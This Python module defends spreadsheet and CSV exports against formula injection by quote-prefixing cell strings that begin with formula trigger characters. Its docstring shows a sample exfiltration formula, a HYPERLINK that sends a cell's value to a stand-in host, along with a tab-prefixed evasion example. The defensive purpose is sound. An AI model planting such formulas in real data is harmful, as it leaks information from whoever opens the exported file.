"""Formula-injection defence for generated spreadsheets and CSVs.

Every export this app produces is opened in Excel, LibreOffice or Sheets — and
those treat a cell whose text begins ``=``, ``+``, ``-`` or ``@`` as a *formula*,
not as data. So a worker whose name is stored as ``=HYPERLINK("http://x/"&A1)``
is inert everywhere in the app (Jinja escapes it, the DB stores it as text) and
becomes live code the moment a payroll officer opens the exported bank listing.
The payload arrives through an ordinary import: names, bank branches and staff
ids all come from client-supplied workbooks.

The fix is the OWASP one — prefix the value with a single quote, which the
spreadsheet strips on display and never evaluates.

This is deliberately **one** helper rather than a check at each writer. Escaping
that lives per-site is escaping that is missing at the next site somebody adds;
the only version worth having is the one every export path calls.

Apply it at the boundary where a value becomes a cell — ``csv.writer.writerow``,
``ws.append``, ``sheet[...] = value`` — and nowhere else. It must not touch
values on their way *into* the database: the stored name is not dangerous, and
quoting it at rest would corrupt it for every other reader.
"""

# Leading characters a spreadsheet reads as the start of a formula. Tab and CR
# are here because Excel strips leading whitespace before deciding, so "\t=cmd"
# is evaluated exactly as "=cmd" would be.
FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

_QUOTE = "'"


def escape_formula(value):
    """Return ``value`` safe to write into a spreadsheet cell.

    Strings that begin with a formula trigger come back prefixed with a single
    quote; everything else is returned **unchanged and untyped-cast**, which is
    the important half of the contract:

      * numbers, dates, ``None`` and booleans pass through as themselves, so an
        amount stays a numeric cell that Excel can sum. Stringifying them here
        would turn every payroll total into text and quietly break the exports.
      * a negative *number* (``-500.00``) is numeric and untouched; only a
        negative-looking *string* is quoted, which is the correct reading — if a
        value arrived as text, it is text.
    """
    if not isinstance(value, str):
        return value
    if value.startswith(FORMULA_TRIGGERS):
        return _QUOTE + value
    return value


def escape_row(values):
    """:func:`escape_formula` across an iterable — one row of cells."""
    return [escape_formula(v) for v in values]
